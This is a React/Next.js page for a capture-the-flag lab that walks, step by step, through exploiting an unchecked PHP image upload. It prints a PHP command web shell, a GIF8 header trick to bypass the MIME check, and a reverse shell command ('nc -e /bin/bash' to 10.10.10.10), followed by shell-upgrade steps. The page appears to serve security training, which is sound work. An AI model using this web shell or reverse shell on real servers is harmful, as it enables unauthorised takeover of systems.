import Link from 'next/link'
import {Card, CardPrimaryAction} from '@rmwc/card';
import {Typography} from '@rmwc/typography';
import {List, CollapsibleList,SimpleListItem} from '@rmwc/list';  
import {Icon, metaIcon } from '@rmwc/icon';
import {TextField} from '@rmwc/textfield'; 
import { Button } from '@rmwc/button';

export default function php() {
function  checkCode(code){

    if(code == "abc"){
        console.log("good")
    }
    else 
    {
        alert("Code is incorrect")
    }

}

    return(
        <>
        <Card> 
        <CardPrimaryAction>
          <div style={{ padding: '1rem' }}>
            <Typography use="headline5" tag="div">
              PHP
            </Typography>
            <Typography use="body1" tag="p" theme="textSecondaryOnBackground">
           PHP is a popular general purpose scripting language used for web devlopment. The idea behind this puzzle is that people 
            who create upload forms in PHP forget to check for the contents of the file. In this puzzle we will exploit the faulty PHP upload,
            it asks us for an image but we wont give it an image. From something so simple you can take control of the entire page and do much more. 
           
            </Typography>
      </div>
      </CardPrimaryAction>
    </Card>
        <List> 
            <p2>  Lets begin!   </p2>

            <CollapsibleList
            handle ={
                <SimpleListItem
                  // metaIcon ='/images/chevron_right.png'
                   text={ 
                       <> 
                   Step 1: Go to the website < a style ={{marginLeft:'4px'}} href = "https://gallery.com" target="_blank"> gallery.com </a>  
                       </>
                   }/>      
            }
            >         
            </CollapsibleList>
            
            <CollapsibleList
            handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 2: Upload a picture the gallery " />      
            
                }
            >         
            <SimpleListItem text = "There should be no issue here, you should be able to see the image you uploaded" /> 
            </CollapsibleList>

            <CollapsibleList
            handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 3:Craete a file titled backdoor.php with the following php code " />      
            
                }
            >         
            <SimpleListItem text = {
                <>
                 {'<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die;}?> '}
                </>
            }/> 
            </CollapsibleList>
            
            <CollapsibleList
            handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 4: Try uploading that php file using the image uplaod  " />      
            
                }
            >         
            <SimpleListItem text = "This should fail because it wants you to upload an image type and you're uploading a php file type" /> 
            </CollapsibleList>
            
            <CollapsibleList
            handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 5: Rename the file to backdoor.php.gif , then Try uploading that php file using the image uplaod  " />      
            
                }
            >         
            <SimpleListItem text = "This should also fail. The problem here is that it is reading your gif file but when it reads you file it is not seeing the correct mime type" /> 
            <SimpleListItem text = {
                <>
                To learn about mime types <a style = {{marginLeft: '4px'}} href = "https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types" target = "_blank" > click here </a>
                </>
            }/>
            </CollapsibleList>

            <CollapsibleList
            handle ={
                <SimpleListItem
                   metaIcon ='/images/chevron_right.png'
                   text="Step 6: Go back to the backdoor.php.gif file and add the line 'GIF8' in front of the script  " />      
            
                }
            >         
            <SimpleListItem text = {
                <>
                 {'GIF8; <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die;}?> '}
                </>
            }/>  
            </CollapsibleList>

            <CollapsibleList
          handle ={
            <SimpleListItem
            metaIcon ='/images/chevron_right.png'
            text="Step 7: You should see a broken image in the Gallery now, open it in a new tab " />
          }
        > 
            </CollapsibleList>

            <CollapsibleList
          handle ={
            <SimpleListItem
            metaIcon ='/images/chevron_right.png'
            text="Step 8: At the end of the url , type '?cmd=ls' " />
          }
        > 
            <SimpleListItem text = "this should looks something like gallery.com/uploads/backdoor.php.gif?cmd=ls" /> 
            <SimpleListItem text = "this should should execute the ls command on this page" />
        
            </CollapsibleList>
          
            <CollapsibleList
            handle ={
            <SimpleListItem
                metaIcon ='/images/chevron_right.png'
                text="Step 9: On you local machine, create a netcat listener " />
          }
        > 
            <SimpleListItem text = "this can be done using the command nc -nlvp 4444" /> 
            </CollapsibleList>

            <CollapsibleList
             handle ={
                 <SimpleListItem
                 metaIcon = '/images/chevron_right.png'
                 text = "Step 10: Replace the ls in the url with 'nc -e /bin/bash 10.10.10.10 4444' (include spaces), hit enter" /> 
             }
            >
            <SimpleListItem text = "In the previous step you started a listener on your machine, when you run this , it should connect to your machine " />
            <SimpleListItem text = "Now you can run commands in your terminal and dont have to do it through the url, try out the ls command "/> 
            <SimpleListItem text = "We have access to a dumbshell right here, we need to upgrade to a real shell so we can run more commands"/> 
            </CollapsibleList>

            <CollapsibleList
             handle ={
                 <SimpleListItem
                 metaIcon = '/images/chevron_right.png'
                 text = "Step 11: Type the following command in the terminal to spawn an interactive shell: python -c ‘import pty; pty.spawn(“/bin/bash”);’  " /> 
             }
            >
            <SimpleListItem text = "now press ctrl+z and enter the command: stty raw -echo; fg " />
            <SimpleListItem text = "Things will look strange here, dont panic, just go to the next step "/> 
            
            </CollapsibleList>

            <CollapsibleList
             handle ={
                 <SimpleListItem
                 metaIcon = '/images/chevron_right.png'
                 text = "Step 12: Run the command 'reset', when prompted for terminal type, enter 'xterm' " /> 
             }
            >
                        
            </CollapsibleList>

            <CollapsibleList
             handle ={
                 <SimpleListItem
                 metaIcon = '/images/chevron_right.png'
                 text = "Step 13: Run the command 'export TERM=xterm-256color'  " /> 
             }
            >
            <SimpleListItem text = "we are in the machine now with lots of control " />
            <SimpleListItem text = "Standard linux commands should work here, try some out"/>
                        
            </CollapsibleList>

            <CollapsibleList
             handle ={
                 <SimpleListItem
                 metaIcon = '/images/chevron_right.png'
                 text = "Step 14: Look for your flag code" /> 
             }
            >
            <SimpleListItem text = "If you are stuck , try running using 'cd' to go to you home folder, then run 'ls' to check what is there" />
            <SimpleListItem text = "Run 'cat OPEN_ME' to get your flag code. "/>
            <p3> Keep this terminal open, it will be useful for the next puzzle </p3>
                        
            </CollapsibleList>
          

        
           

          
        </List>
        <div className="flagCode">
            <TextField id = "code" label = "Flag Code" style={{ width: '20%' ,background: 'lightblue'}} />
            <Button label="Submit"  unelevated  style={{background:'White' , color:'black', height: '40px', width: '40px'}} 
             onClick={() => checkCode(document.getElementById("code").value)} />
         
        </div>
  


        </>
    )
}